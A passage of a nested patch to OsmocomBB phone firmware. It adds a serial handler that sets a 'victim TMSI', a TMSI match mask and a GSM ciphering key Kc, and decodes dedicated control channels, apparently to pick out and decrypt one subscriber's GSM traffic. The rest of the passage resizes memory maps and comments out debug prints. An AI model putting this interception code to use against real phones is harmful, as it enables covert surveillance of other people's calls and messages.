++	struct l1ctl_data_ind *ccch;
++
++	ccch = (struct l1ctl_data_ind *) msg->l2h;
+ 
+ 	switch (l1h->msg_type) {
+ 	case L1CTL_PM_CONF:
+@@ -1412,16 +2849,22 @@ static void l1a_l23_tx(struct msgb *msg)
+ 	case L1CTL_FBSB_CONF:
+ 		dl = (struct l1ctl_info_dl *) l1h->data;
+ 		sb = (struct l1ctl_fbsb_conf *) dl->payload;
+-		if (sb->result == 0)
++		if (sb->result == 0){
+ 			sync_result = "ok";
+-		else
++		} else {
+ 			sync_result = "error";
++			reenter_sync();
++		}
+ 		bsic = sb->bsic;
+ 		break;
+ 	case L1CTL_DATA_IND:
+ 		dl = (struct l1ctl_info_dl *) l1h->data;
+ 		msg->l2h = dl->payload;
++
+ 		rsl_dec_chan_nr(dl->chan_nr, &chan_type, &chan_ss, &chan_ts);
++		gsm_fn2gsmtime(&tm, ntohl(dl->frame_nr));
++
++		//printf("[%d] %s (%.4u/%.2u/%.2u) %d dBm: %s\n", chan_type, rsl_chan_nr_str(dl->chan_nr), tm.t1, tm.t2, tm.t3, (int)dl->rx_level-110, osmo_hexdump(msg->data, msg->len));
+ 
+ 		power = dl->rx_level;
+ 		if (dl->fire_crc >= 2) {
+@@ -1436,9 +2879,24 @@ static void l1a_l23_tx(struct msgb *msg)
+ 			rx_bcch(msg);
+ 			break;
+ 		case RSL_CHAN_PCH_AGCH:
++			update_net_frame();
+ 			msg->l3h = msg->l2h;
++			/* CCCH */
+ 			rx_pch_agch(msg);
+ 			break;
++		case RSL_CHAN_Bm_ACCHs:
++		case RSL_CHAN_Lm_ACCHs:
++		case RSL_CHAN_SDCCH4_ACCH:
++		case RSL_CHAN_SDCCH8_ACCH:
++			update_net_frame();
++			msgb_pull(msg, (sizeof(struct l1ctl_info_dl) + sizeof(struct l1ctl_hdr)));
++			msg->l1h = NULL;
++			msg->l3h = msg->l2h;
++			if(msg->data[0] != 0x07){
++				printf("[%d] %s (%.4u/%.2u/%.2u) %d dBm: %s\n", chan_type, rsl_chan_nr_str(dl->chan_nr), tm.t1, tm.t2, tm.t3, (int)dl->rx_level-110, osmo_hexdump(msg->data, msg->len));
++				rx_acch(msg);
++			}
++			break;
+ 		}
+ 		sercomm_sendmsg(SC_DLCI_L1A_L23, msg);
+ 		return; /* msg is freed by sercom */
+@@ -1478,6 +2936,43 @@ static void console_rx_cb(uint8_t dlci, struct msgb *msg)
+ 	msgb_free(msg);
+ }
+ 
++static void mobile_identity_rx_cb(uint8_t dlci, struct msgb *msg)
++{
++	int i;
++	printf("mobile_identity_rx_cb (DLCI %d): ", dlci);
++
++	/* yes this code sucks, i realized later that i need to set more than one
++	   thing so i should've made a byte encoding the type of information to set ;)
++	*/
++	if(msg->len == 2){
++		printf("setting TMSI match mask to: %02x-%02x\n", msg->data[0], msg->data[1]);
++		tmsi_range_min = msg->data[0];
++		tmsi_range_max = msg->data[1];
++		return;
++	}
++	if(msg->len >= 8){
++		printf("setting Kc to: ");
++		for (i = 0; i < msg->len && i < 8; i++) {
++			kc[i] = msg->data[i];
++			printf("%02x ", kc[i]);
++		}
++		puts("\n");
++		cipher_mode = CIPHER_ACTIVE;
++		if(msg->len == 9){
++			key_seq = msg->data[8];
++			printf("setting key sequence to: %02x\n", key_seq);
++		}
++		return;
++	}
++
++	printf("changing victim TMSI to: ");
++	for (i = 0; i < msg->len && i < 4; i++) {
++		victim_tmsi[i] = msg->data[i];
++		printf("%02x ", victim_tmsi[i]);
++	}
++	puts("\n");
++}
++
+ static void l1a_l23_rx_cb(uint8_t dlci, struct msgb *msg)
+ {
+ 	int i;
+@@ -1508,9 +3003,6 @@ int main(void)
+ {
+ 	board_init();
+ 
+-	puts("\n\nOSMOCOM Monitor Tool (revision " GIT_REVISION ")\n");
+-	puts(hr);
+-
+ 	/* Dump device identification */
+ 	dump_dev_id();
+ 	puts(hr);
+@@ -1519,6 +3011,7 @@ int main(void)
+ 	calypso_clk_dump();
+ 	puts(hr);
+ 
++	INIT_LLIST_HEAD(&mi_queue);
+ 	keypad_set_handler(&key_handler);
+ 
+ 	/* Dump clock config after PLL set */
+@@ -1527,6 +3020,7 @@ int main(void)
+ 
+ 	sercomm_register_rx_cb(SC_DLCI_CONSOLE, console_rx_cb);
+ 	sercomm_register_rx_cb(SC_DLCI_L1A_L23, l1a_l23_rx_cb);
++	sercomm_register_rx_cb(SC_DLCI_TMSI, mobile_identity_rx_cb);
+ 
+ 	layer1_init();
+ 	l1a_l23_tx_cb = l1a_l23_tx;
+@@ -1535,24 +3029,21 @@ int main(void)
+ 
+ 	tpu_frame_irq_en(1, 1);
+ 
+-	buzzer_mode_pwt(1);
+-	buzzer_volume(0);
+-
+ 	memset(pm_spectrum, 0, sizeof(pm_spectrum));
+ 	memset(ul_max, 0, sizeof(ul_max));
+ 
+ 	/* inc 0 to 1 and refresh */
+-	inc_dec_arfcn(1);
++	inc_dec_arfcn(30);
+ 
+ 	while (1) {
+ 		l1a_compl_execute();
+ 		osmo_timers_update();
+ 		handle_key_code();
+ 		l1a_l23_handler();
+-		handle_pm();
++		//handle_pm();
+ 		handle_sync();
+-		handle_assign();
+-		handle_tone();
++		//handle_assign();
++		handle_stuck();
+ 	}
+ 
+ 	/* NOT REACHED */
+diff --git a/src/target/firmware/battery/compal_e88.c b/src/target/firmware/battery/compal_e88.c
+index 609d406..bcfea84 100644
+--- a/src/target/firmware/battery/compal_e88.c
++++ b/src/target/firmware/battery/compal_e88.c
+@@ -284,6 +284,7 @@ bat_compal_e88_upd_measurements(){
+ 	}
+ 
+         /* DEBUG */
++	/*
+         printf("BAT-ADC: ");
+         for(i=0;i<MADC_NUM_CHANNELS;i++)
+                 printf("%3d ",bat_compal_e88_madc[i]);
+@@ -302,6 +303,7 @@ bat_compal_e88_upd_measurements(){
+         printf("\tBCICTL2=0x%03x\n",i);      
+ 	printf("\tbattery-info.flags=0x%08x\n",battery_info.flags);
+ 	printf("\tbat_compal_e88_chg_state=%d\n",bat_compal_e88_chg_state);
++	*/
+ }
+ 
+ /* bat_compal_e88_adc_read() :
+diff --git a/src/target/firmware/board/compal/highram.lds b/src/target/firmware/board/compal/highram.lds
+index 498a2fa..5d802e2 100644
+--- a/src/target/firmware/board/compal/highram.lds
++++ b/src/target/firmware/board/compal/highram.lds
+@@ -16,9 +16,9 @@ MEMORY
+     /* lowram: could be anything, we place exception vectors here */
+ 	XRAM (rw) : ORIGIN = 0x00800000, LENGTH = 0x00020000
+     /* highram binary: our text, initialized data */
+-    LRAM (rw) : ORIGIN = 0x00820000, LENGTH = 0x00014000
++    LRAM (rw) : ORIGIN = 0x00820000, LENGTH = 0x00024000
+     /* highram binary: our unitialized data, stacks, heap */
+-    IRAM (rw) : ORIGIN = 0x00834000, LENGTH = 0x0000c000
++    IRAM (rw) : ORIGIN = 0x00844000, LENGTH = 0x0000c000
+ }
+ SECTIONS
+ {
+diff --git a/src/target/firmware/board/compal/ram.lds b/src/target/firmware/board/compal/ram.lds
+index 9503ede..8528072 100644
+--- a/src/target/firmware/board/compal/ram.lds
++++ b/src/target/firmware/board/compal/ram.lds
+@@ -11,9 +11,9 @@ ENTRY(_start)
+ MEMORY
+ {
+     /* compal-loaded binary: our text, initialized data */
+-    LRAM (rw) : ORIGIN = 0x00800000, LENGTH = 0x00014000
++    LRAM (rw) : ORIGIN = 0x00800000, LENGTH = 0x00024000
+     /* compal-loaded binary: our unitialized data, stacks, heap */
+-    IRAM (rw) : ORIGIN = 0x00814000, LENGTH = 0x0000c000
++    IRAM (rw) : ORIGIN = 0x00824000, LENGTH = 0x0000c000
+ }
+ SECTIONS
+ {
+diff --git a/src/target/firmware/include/comm/sercomm.h b/src/target/firmware/include/comm/sercomm.h
+index 54256b5..4188230 100644
+--- a/src/target/firmware/include/comm/sercomm.h
++++ b/src/target/firmware/include/comm/sercomm.h
+@@ -21,6 +21,7 @@ enum sercomm_dlci {
+ 	SC_DLCI_L1A_L23 = 5,
+ 	SC_DLCI_LOADER  = 9,
+ 	SC_DLCI_CONSOLE = 10,
++	SC_DLCI_TMSI    = 127,
+ 	SC_DLCI_ECHO    = 128,
+ 	_SC_DLCI_MAX
+ };
+diff --git a/src/target/firmware/layer1/l23_api.c b/src/target/firmware/layer1/l23_api.c
+index ae39e63..1de6a77 100644
+--- a/src/target/firmware/layer1/l23_api.c
++++ b/src/target/firmware/layer1/l23_api.c
+@@ -521,6 +522,7 @@ static void l1ctl_rx_tch_mode_req(struct msgb *msg)
+ /* receive a L1CTL_NEIGH_PM_REQ from L23 */
+ static void l1ctl_rx_neigh_pm_req(struct msgb *msg)
+ {
++	return 0;
+ 	struct l1ctl_hdr *l1h = (struct l1ctl_hdr *) msg->data;
+ 	struct l1ctl_neigh_pm_req *pm_req =
+ 		(struct l1ctl_neigh_pm_req *) l1h->data;
+@@ -590,6 +592,8 @@ static struct llist_head l23_rx_queue = LLIST_HEAD_INIT(l23_rx_queue);
+ void l1a_l23_rx(uint8_t dlci, struct msgb *msg)
+ {
+ 	unsigned long flags;
++	struct l1ctl_hdr *l1h;
++	l1h = (struct l1ctl_hdr *) msg->data;
+ 
+ 	local_firq_save(flags);
+ 	msgb_enqueue(&l23_rx_queue, msg);
+@@ -610,15 +614,17 @@ void l1a_l23_handler(void)
+ 
+ 	l1h = (struct l1ctl_hdr *) msg->data;
+ 
+-#if 0
+-	{
+-		int i;
+-		printf("l1a_l23_rx_cb (%u): ", msg->len);
+-		for (i = 0; i < msg->len; i++)
+-			printf("%02x ", msg->data[i]);
+-		puts("\n");
++	printf(" \n");
++
++	if(l1h->msg_type != L1CTL_PM_REQ){
++		{
++			int i;
++			printf("l1a_l23_rx_cb (%u): ", msg->len);
++			for (i = 0; i < msg->len; i++)
++				printf("%02x ", msg->data[i]);
++			puts("\n");
++		}
+ 	}
+-#endif
+ 
+ 	msg->l1h = msg->data;
+ 
+diff --git a/src/target/firmware/layer1/prim_pm.c b/src/target/firmware/layer1/prim_pm.c
+index 1630600..6e208b4 100644
+--- a/src/target/firmware/layer1/prim_pm.c
++++ b/src/target/firmware/layer1/prim_pm.c
+@@ -91,12 +91,14 @@ static int l1s_pm_resp(uint8_t num_meas, __unused uint8_t p2,
+ 
+ 	l1ddsp_meas_read(num_meas, pm_level);
+ 
+-	printf("PM MEAS: ARFCN=%u, %-4d dBm at baseband, %-4d dBm at RF\n",
++	/*printf("PM MEAS: ARFCN=%u, %-4d dBm at baseband, %-4d dBm at RF\n",
+ 		arfcn, pm_level[0]/8, agc_inp_dbm8_by_pm(pm_level[0])/8);
+ 
+ 	printd("PM MEAS: %-4d dBm, %-4d dBm ARFCN=%u\n",
+ 		agc_inp_dbm8_by_pm(pm_level[0])/8,
+ 		agc_inp_dbm8_by_pm(pm_level[1])/8, arfcn);
++	
++	*/
+ 
+ 	if (!l1s.pm.msg)
+ 		l1s.pm.msg = l1ctl_msgb_alloc(L1CTL_PM_CONF);
+diff --git a/src/target/firmware/layer1/sync.c b/src/target/firmware/layer1/sync.c
+index 36f4297..d64aec7 100644
+--- a/src/target/firmware/layer1/sync.c
++++ b/src/target/firmware/layer1/sync.c
+@@ -197,9 +197,11 @@ static inline void check_lost_frame(void)
+ 	diff = last_timestamp - timestamp;
+ 
+ 	/* allow for a bit of jitter */
++	/*
+ 	if (diff < TIMER_TICKS_PER_TDMA - TIMER_TICK_JITTER ||
+ 	    diff > TIMER_TICKS_PER_TDMA + TIMER_TICK_JITTER)
+ 		printf("LOST %d!\n", diff);
++	*/
+ 
+ 	last_timestamp = timestamp;
+ }
